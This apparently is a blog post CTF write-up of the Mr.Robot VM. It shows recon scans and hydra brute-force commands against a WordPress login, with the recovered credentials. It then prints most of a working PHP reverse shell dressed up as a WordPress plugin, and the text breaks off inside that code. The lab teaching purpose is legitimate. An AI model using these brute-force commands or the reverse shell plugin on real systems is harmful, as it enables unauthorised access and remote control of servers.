<!DOCTYPE html>
<html lang=en>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Hello there !This is my writeup for the famous Mr.Robot CTF virtual machine. I used the platform TryHackMe but you can find this VM on Vulnhub. The goal is to find 3 hidden flags. When starting to att">
<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="Mr.Robot CTF">
<meta property="og:url" content="http://slayne.github.io/2019/05/19/CTF/index.html">
<meta property="og:site_name" content="The Hacker Apprentice">
<meta property="og:description" content="Hello there !This is my writeup for the famous Mr.Robot CTF virtual machine. I used the platform TryHackMe but you can find this VM on Vulnhub. The goal is to find 3 hidden flags. When starting to att">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://imgur.com/SAeIASM.png">
<meta property="og:image" content="https://imgur.com/XQSqoNx.png">
<meta property="og:image" content="https://imgur.com/IbwuWHT.png">
<meta property="og:image" content="https://imgur.com/Fz46UtJ.png">
<meta property="og:image" content="https://imgur.com/VMnNFv0.png">
<meta property="og:image" content="https://imgur.com/llr52hP.png">
<meta property="og:updated_time" content="2019-05-19T17:41:21.013Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Mr.Robot CTF">
<meta name="twitter:description" content="Hello there !This is my writeup for the famous Mr.Robot CTF virtual machine. I used the platform TryHackMe but you can find this VM on Vulnhub. The goal is to find 3 hidden flags. When starting to att">
<meta name="twitter:image" content="https://imgur.com/SAeIASM.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Mr.Robot CTF</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/resume.html">Resume</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2016/02/26/heap0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2019/05/19/CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2019/05/19/CTF/&text=Mr.Robot CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2019/05/19/CTF/&is_video=false&description=Mr.Robot CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Mr.Robot CTF&body=Check out this article: http://slayne.github.io/2019/05/19/CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2019/05/19/CTF/&name=Mr.Robot CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-gathering"><span class="toc-number">1.</span> <span class="toc-text">Information gathering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-reverse-shell"><span class="toc-number">2.</span> <span class="toc-text">Getting a reverse shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root"><span class="toc-number">3.</span> <span class="toc-text">Getting root</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Mr.Robot CTF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">The Hacker Apprentice</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-05-19T14:54:53.000Z" itemprop="datePublished">19-05-2019</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/ctf/">ctf</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>Hello there !<br>This is my writeup for the famous Mr.Robot CTF virtual machine. I used the platform <a href="https://tryhackme.com/room/mrrobot" target="_blank" rel="noopener">TryHackMe</a> but you can find this VM on <a href="https://www.vulnhub.com/entry/mr-robot-1,151/" target="_blank" rel="noopener">Vulnhub</a>. The goal is to find 3 hidden flags.</p>
<p>When starting to attack a new machine I always add the IP of the VM to my <code>/etc/hosts</code> file to avoid dealing with adresses. So for the rest of this writeup, the domain name of the VM will be <code>mrrobot.thm</code>.</p>
<h2 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h2><p>First thing first, letâ€™s scan the machine with nmap to see its open ports :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># nmap -sC -sV -oA mrrobot mrrobot.thm                                                                                                                      root@kali</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 17:09 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> mrrobot.thm (10.0.0.36)</span><br><span class="line">Host is up (0.023s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http    Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">443/tcp open   ssl/ssl Apache httpd (SSL-only mode)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-title: Site doesn'</span>t have a title (text/html).</span><br><span class="line">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="line">| Not valid before: 2015-09-16T10:45:03</span><br><span class="line">|_Not valid after:  2025-09-13T10:45:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 19.91 seconds</span><br></pre></td></tr></table></figure></p>
<p>We see that there is a webserver running. So while we explore it, letâ€™s run a gobuster scan to find hidden files and directories.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># gobuster -u http://mrrobot.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt                                           root@kali</span></span><br></pre></td></tr></table></figure>
<p>The website is a fun interactive page where you can watch some videos from the show by typing commands but there is not much information we can use. Letâ€™s see the result of the gobuster command :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># cat gobuster.txt                                                                                                                                          root@kali</span></span><br><span class="line">/images (Status: 301)</span><br><span class="line">/blog (Status: 301)</span><br><span class="line">/sitemap (Status: 200)</span><br><span class="line">/rss (Status: 301)</span><br><span class="line">/login (Status: 302)</span><br><span class="line">/0 (Status: 301)</span><br><span class="line">/video (Status: 301)</span><br><span class="line">/feed (Status: 301)</span><br><span class="line">/image (Status: 301)</span><br><span class="line">/atom (Status: 301)</span><br><span class="line">/wp-content (Status: 301)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">/audio (Status: 301)</span><br><span class="line">/intro (Status: 200)</span><br><span class="line">/wp-login (Status: 200)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/rss2 (Status: 301)</span><br><span class="line">/license (Status: 200)</span><br><span class="line">/wp-includes (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/Image (Status: 301)</span><br><span class="line">/rdf (Status: 301)</span><br><span class="line">/page1 (Status: 301)</span><br><span class="line">/readme (Status: 200)</span><br><span class="line">/robots (Status: 200)</span><br><span class="line">/dashboard (Status: 302)</span><br><span class="line">/%!(NOVERB) (Status: 301)</span><br></pre></td></tr></table></figure>
<p>We notice that this is probably a wordpress blog and that we have a few accesible pages, letâ€™s check them out.</p>
<p>License and readme do not help us very much but here is robots :<br><img src="https://imgur.com/SAeIASM.png" alt="robots"></p>
<p>We have our first flag ! there is also a <code>fscocity.dic</code> that we can grab. After curling both files, fsociety.dic seems to be a wordlist that we will probably use later.</p>
<h2 id="Getting-a-reverse-shell"><a href="#Getting-a-reverse-shell" class="headerlink" title="Getting a reverse shell"></a>Getting a reverse shell</h2><p>Now letâ€™s go to the <code>wp-login</code> page : </p>
<p><img src="https://imgur.com/XQSqoNx.png" alt="login"></p>
<p>When we try a dummy username/password, Worpdress tells us that the username does not exist.<br><img src="https://imgur.com/IbwuWHT.png" alt="login"></p>
<p>So i figured I would try to bruteforce the username and then the password with the wordlist we got earlier. Letâ€™s look at burp to see the POST parameter used :</p>
<p><img src="https://imgur.com/Fz46UtJ.png" alt="burp"></p>
<p>Letâ€™s fire up hydra (note that it is important to pass all the parameters to hydra otherwise it wonâ€™t work) :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># hydra -L fsocity.dic -p test mrrobot.thm http-post-form "/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username"</span></span><br><span class="line">Hydra v8.8 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-05-19 17:53:18</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task</span><br><span class="line">[DATA] attacking http-post-form://mrrobot.thm:80/wp-login/:<span class="built_in">log</span>=^USER^&amp;<span class="built_in">pwd</span>=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username</span><br><span class="line">[80][http-post-form] host: mrrobot.thm   login: Elliot   password: <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<p>Bingo, our username is <code>Elliot</code>. Now letâ€™s try to get the password :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># hydra -l Elliot -P fsocity.dic mrrobot.thm http-post-form "/wp-login/:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&amp;testcookie=1:S=302"</span></span><br><span class="line">Hydra v8.8 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-05-19 17:56:37</span><br><span class="line">[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task</span><br><span class="line">[DATA] attacking http-post-form://mrrobot.thm:80/wp-login/:<span class="built_in">log</span>=^USER^&amp;<span class="built_in">pwd</span>=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&amp;testcookie=1:S=302</span><br><span class="line">[...]</span><br><span class="line">[80][http-post-form] host: mrrobot.thm   login: Elliot   password: ER28-0652</span><br></pre></td></tr></table></figure>
<p>Now we also have the password <code>ER28-0652</code>.<br>After login, this is what we get :<br><img src="https://imgur.com/VMnNFv0.png" alt="portal"></p>
<p>Browsing the panel, we notice that we can upload new plugins. Letâ€™s try to get a reverse shell that way.<br>If you use kali you can find a php reverse shell here : <code>/usr/share/webshells/php/php-reverse-shell.php</code>.<br>For Worpdress to understand that this file is a plugin we have to edit it a bit by adding some information in a comment block :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name:  Reverse Shell</span></span><br><span class="line"><span class="comment">Plugin URI: http://shell.com</span></span><br><span class="line"><span class="comment">Description: gimme a shell</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: me</span></span><br><span class="line"><span class="comment">Author URI: http://www.me.com</span></span><br><span class="line"><span class="comment">Text Domain: shell</span></span><br><span class="line"><span class="comment">Domain Path: /languages</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  The author accepts no liability</span></span><br><span class="line"><span class="comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></span><br><span class="line"><span class="comment">// do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// In all other respects the GPL version 2 applies:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">// it under the terms of the GNU General Public License version 2 as</span></span><br><span class="line"><span class="comment">// published by the Free Software Foundation.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">// GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></span><br><span class="line"><span class="comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></span><br><span class="line"><span class="comment">// you, then do not use this tool.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// You are encouraged to send comments, improvements or suggestions to</span></span><br><span class="line"><span class="comment">// me at pentestmonkey@pentestmonkey.net</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Description</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></span><br><span class="line"><span class="comment">// The recipient will be given a shell running as the current user (apache normally).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Limitations</span></span><br><span class="line"><span class="comment">// -----------</span></span><br><span class="line"><span class="comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></span><br><span class="line"><span class="comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></span><br><span class="line"><span class="comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage</span></span><br><span class="line"><span class="comment">// -----</span></span><br><span class="line"><span class="comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></span><br><span class="line"></span><br><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">''</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">4444</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line"><span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">'pcntl_fork'</span>)) &#123;</span><br><span class="line">	<span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">	$pid = pcntl_fork();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Can't fork"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make the current process a session leader</span></span><br><span class="line">	<span class="comment">// Will only succeed if we forked</span></span><br><span class="line">	<span class="keyword">if</span> (posix_setsid() == <span class="number">-1</span>) &#123;</span><br><span class="line">		printit(<span class="string">"Error: Can't setsid()"</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$daemon = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	printit(<span class="string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line">chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line">umask(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$sock) &#123;</span><br><span class="line">	printit(<span class="string">"$errstr ($errno)"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource($process)) &#123;</span><br><span class="line">	printit(<span class="string">"ERROR: Can't spawn shell"</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></span><br><span class="line">stream_set_blocking($pipes[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($pipes[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line">stream_set_blocking($sock, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">"Successfully opened reverse shell to $ip:$port"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="comment">// Check for end of TCP connection</span></span><br><span class="line">	<span class="keyword">if</span> (feof($sock)) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Shell connection terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check for end of STDOUT</span></span><br><span class="line">	<span class="keyword">if</span> (feof($pipes[<span class="number">1</span>])) &#123;</span><br><span class="line">		printit(<span class="string">"ERROR: Shell process terminated"</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span 